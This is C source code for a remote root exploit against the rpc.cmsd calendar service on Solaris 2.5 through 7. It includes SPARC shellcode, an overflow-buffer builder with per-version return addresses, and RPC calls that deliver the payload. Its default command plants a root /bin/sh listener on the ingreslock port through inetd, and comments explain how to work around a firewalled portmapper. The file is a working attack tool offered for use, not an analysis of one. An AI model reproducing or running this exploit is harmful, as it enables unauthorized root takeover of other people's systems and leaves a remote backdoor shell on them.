/* Additions by MagicFX to root most Solaris 7 sparc boxes.
 * Look at options 5 and 6.
 *
 */

/*
 * remote rpc.cmsd exploit - horizon
 * for solaris 2.5 / 2.5.1 / 2.6 
 *
 * mad thanks to stran9er, #!adm, and word to apk
 *
 * "and we become what we hate... dont think about it"
 *
 * Note for 2.6: you need to specify the machine's hostname with the -h
 * option. It has to be what gethostname() returns on that machine. I.E.
 *
 * ./cmsd -h owned 1 owned.blah.org
 *
 * Note for firewalled portmapper: we are sending a udp packet to the cmsd
 * service which is being monitored by inetd. That will cause the cmsd program
 * to be executed, and it will register itself as a tcp service with 
 * portmapper. Then, we send a tcp packet to finish the attack. To get around
 * a firewalled portmapper, you should run the program with the -s option,
 * which will fire off rpc.cmsd without crashing it, and then you can port 
 * scan to figure out which tcp port it is using. Then you can run the real 
 * attack and specify the correct udp and tcp ports.
 */

#include <stdio.h>
#include <stdlib.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include "rtable4.h"

struct version
{
   int num;
   char *id;
   int   space;
   long  address;
};

struct version verlist[] = 
{
   { 1, "Solaris 2.5.1 /usr/dt/bin/rpc.cmsd      338844 [2-5]", 0, 0xefffcc88 },
   { 2, "Solaris 2.5.1 /usr/openwin/bin/rpc.cmsd 200284 [2-4]", 0, 0xefffcb34 },
   { 3, "Solaris 2.5   /usr/openwin/bin/rpc.cmsd 271892 [2-4]", 0, 0xefffcc08 },
   { 4, "Solaris 2.6   /usr/dt/bin/rpc.cmsd      347712 [2-5]", 28, 0xefffeab4},
   { 5, "Solaris 7     /usr/dt/bin/rpc.cmsd", 28, 0xefffe90c},
   { 6, "Solaris 7     /usr/dt/bin/rpc.cmsd (2)", 28, 0xefffe80c},
   { 7, "Solaris 7 (x86) .../dt/bin/rpc.cmsd     329080 [2-5]",-300, 0xd07a0408},
   { 8, "Solaris 2.6_x86 .../dt/bin/rpc.cmsd     318008 [2-5]",-300, 0x4c7c0408},
   { 0, 0, 0, 0} 
};

/* simple shell code I put together. runs an arbitrary command through ksh -c.
 * you can strcat your command onto the end of the shellcode to use it.
 * I got the bn,a .-4; bn,a .-4; call .-4 technique from tt.c by apk. */

char *sc=
        "\x90\x08\x3f\xff\x82\x10\x20\x8d\x91\xd0\x20\x08"
        "\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
        "\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff"
        "\xa6\x1c\xc0\x13\xe6\x23\xe0\x58\xe6\x23\xe0\x60"
        "\x90\x03\xe0\x50\x94\x1a\x80\x0a\x92\x0b\x80\x0e"
        "\x9c\x03\xa0\x10\xac\x03\xe0\x50\xec\x23\xbf\xf0"
        "\xac\x03\xe0\x5c\xec\x23\xbf\xf4\xac\x03\xe0\x64"
        "\xec\x23\xbf\xf8\xe6\x23\xbf\xfc\x82\x10\x20\x3b"
        "\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
        "\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x6b\x73\x68"
        "\x30\x30\x30\x30\x2d\x63\x63\x63\x30\x30\x30\x30\x00";


#define BUFLEN 1024
#define SAFEADDR 0xeffffd08
#define SPARC_NOP 0xac15a16e

char *make_overflow(char *command, long address)
{
   static char buf[16384];
   long *k;
   char *j;
   int i;
 
   k=(long *)buf;

   for (i=0;i<(BUFLEN+52)/4;i++)
       k[i]=SAFEADDR;

   for (;i<(BUFLEN+64)/4;i++)
       k[i]=address;

   for (;i<(BUFLEN+500)/4;i++)
       k[i]=SPARC_NOP;

   j=(char *)&(k[i]);
   for (i=0;i<strlen(sc);i++)
       j[i]=sc[i];

   strcpy(&j[i],command);

   return &buf[2];
}

void usage(char *name)
{
   int i; 

   fprintf(stderr,"\nusage: %s [-s] [-h hostname] [-c command] [-u port] [-t port] version host\n",name);
   fprintf(stderr,"\n   -s: just start up rpc.cmsd (useful with a firewalled portmapper)\n");
   fprintf(stderr,"   -h: (for 2.6) specifies the hostname of the target\n");
   fprintf(stderr,"   -c: specifies an alternate command\n");
   fprintf(stderr,"   -u: specifies a port for the udp portion of the attack\n");
   fprintf(stderr,"   -t: specifies a port for the tcp portion of the attack\n");
   fprintf(stderr,"\nAvailable versions:\n");
   i=-1;
   while (verlist[++i].id)
   {
       fprintf(stderr,"   %d: %s\n", verlist[i].num, verlist[i].id);
   }
   fprintf(stderr,"\n");
   exit(1);
}

int main(int argc, char **argv)
{
   int sd, res, i;
   struct hostent *hp;
   struct sockaddr_in saddr;
   CLIENT *clnt;
   AUTH *au;
   struct timeval tv = { 25, 0 };
   char *progname;

   Table_Op_Args toa;
   Table_Status create_res;

   Appt ap;
   Table_Args ta;
   Table_Res insert_res;

   char calname[64];
   char hostname[256];
   char space[16384]; 
   char *command;
   int arch;
   long address;

   char *realname="arthurdent";
   int udp_port=0;
   int tcp_port=0;
   int juststart=0;

   command=(char *)strdup("echo \"ingreslock stream tcp nowait root /bin/sh sh -i\" >>/tmp/bob ; /usr/sbin/inetd -s /tmp/bob ");

   progname=argv[0];

   while ((i=getopt(argc,argv,"h:c:u:t:s"))!=EOF)
   {
       switch (i)
       {
           case 's': juststart=1;
                     break;
           case 'h': realname=(char *)strdup(optarg);
                     break;
           case 'c': command=(char *)strdup(optarg);
                     break;
           case 'u': udp_port=atoi(optarg);
                     break;
           case 't': tcp_port=atoi(optarg);
                     break;
           default : usage(argv[0]);
       }
   }

   argc-=optind;
   argv+=optind;

   if (argc!=2)
   {
       usage(progname);
   }


   if (!(hp=(struct hostent *)gethostbyname(argv[1])))
   {
       fprintf(stderr,"bad host\n");
       exit(1);
   }

   arch=atoi(argv[0])-1; 
  
   bzero(&saddr,sizeof(saddr));
   saddr.sin_family=AF_INET;
   saddr.sin_port=htons(udp_port);
   saddr.sin_addr=*((struct in_addr *) hp->h_addr);

   au=authunix_create(realname,0,0,0,0);

   sd=RPC_ANYSOCK;
   clnt=(CLIENT *) clntudp_create(&saddr, TABLEPROG, 4, tv, &sd);
   if (!clnt)
   {
       clnt_pcreateerror(argv[0]);
       exit(1);
   }

   clnt->cl_auth=au;

   bzero(&toa,sizeof(toa));
   srandom(getpid()*time(NULL));
   strcpy(calname,"root.");
   calname[5]=(random()%20)+'A';
   calname[6]=(random()%20)+'A';
   calname[7]=(random()%20)+'A';
   calname[8]=0;
   strcat(calname,"@foobar");
   toa.target=calname;

   bzero(&create_res,sizeof(create_res));
   res=clnt_call(clnt, rtable_create, xdr_Table_Op_Args, (caddr_t) &toa,
                 xdr_Table_Status, (caddr_t) &create_res, tv);
   if (res!=RPC_SUCCESS)
      clnt_perror(clnt, "clnt_call[rtable_create]");
   else
      fprintf(stderr,"rtable_create worked\n");

   clnt_destroy(clnt);

   if (juststart)
      exit(0);

   bzero(&saddr,sizeof(saddr));
   saddr.sin_family=AF_INET;
   saddr.sin_port=htons(tcp_port);
   saddr.sin_addr=*((struct in_addr *) hp->h_addr);

   sd=RPC_ANYSOCK;
   clnt=(CLIENT *) clnttcp_create(&saddr, TABLEPROG, 4, &sd, 0, 0);
   if (!clnt)
   {
       clnt_pcreateerror(argv[0]);
       exit(1);
   }

   clnt->cl_auth=au;

   for (i=0;i<(2000+verlist[arch].space);space[i++]=0xaa);
   space[i++]=0;

   address=verlist[arch].address;
   bzero(&ap,sizeof(ap));
   ap.client_data=make_overflow(command,address);
   ap.what=((char *)space);
   ap.duration=10;
   ap.next=NULL;
   ap.ntimes=10;
   ap.period.period=3;
   ap.period.nth=421;
   ap.attr=NULL;
   ap.exception=NULL;
   ap.tag=NULL;

   bzero(&ta,sizeof(ta));
   ta.target=calname;
   ta.args.tag=APPT;
   ta.args.Args_u.appt=&ap;

   tv.tv_sec=10;

   bzero(&insert_res,sizeof(insert_res));
   res=clnt_call(clnt, rtable_insert, xdr_Table_Args, (caddr_t) &ta,
                 xdr_Table_Res, (caddr_t) &insert_res, tv); 
   if (res!=RPC_SUCCESS)
      clnt_perror(clnt, "clnt_call[rtable_insert]");
   else
      fprintf(stderr,"rtable_insert worked\n");

   clnt_destroy(clnt);
}
